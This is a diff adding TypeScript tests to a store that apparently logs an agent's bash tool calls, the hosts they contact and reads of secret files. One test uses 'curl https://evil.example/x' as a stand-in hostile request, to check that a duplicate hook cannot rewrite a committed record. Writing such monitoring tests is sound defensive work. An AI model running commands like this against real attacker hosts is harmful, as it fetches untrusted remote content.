@@ -81,6 +81,31 @@ function pairingContract(make: StoreFactory): void {
       expect(cf.secretReadsSince(0).map((r) => r.path)).toEqual(["/work/repo/.env"]);
     });
 
+    test("a duplicate pre never rewrites the committed record or its hosts", async () => {
+      const { cf } = setup(make);
+      cf.recordPre(await bashPre("ls", { callId: "call_dup" }));
+      cf.recordPost(await bashPost("ls", {}, { callId: "call_dup" }));
+      cf.recordPre(await bashPre("curl https://evil.example/x", { callId: "call_dup" }));
+      const [call] = cf.recentCalls(1);
+      expect(call?.hosts).toEqual([]);
+      expect(call?.argv).toEqual(["ls"]);
+      expect(cf.hostsSeen().size).toBe(0);
+      expect(cf.anomalies()).toEqual(["pre after post for call_dup"]);
+    });
+
+    test("hostsFirstSeen names the call that first contacted each host", async () => {
+      const { cf, clock } = setup(make);
+      cf.recordPre(await bashPre("curl https://a.example", { callId: "call_h1" }));
+      clock.advance(5);
+      cf.recordPre(
+        await bashPre("curl https://a.example https://b.example", { callId: "call_h2" }),
+      );
+      expect([...cf.hostsFirstSeen()]).toEqual([
+        ["a.example", { at: 1_000_000, callId: "call_h1" }],
+        ["b.example", { at: 1_000_005, callId: "call_h2" }],
+      ]);
+    });
+
     test("recentCalls: exactly at the window edge is inside, one ms earlier is outside", async () => {
       const { cf, clock } = setup(make);
       cf.recordPre(await bashPre("ls", { callId: "call_old" }));
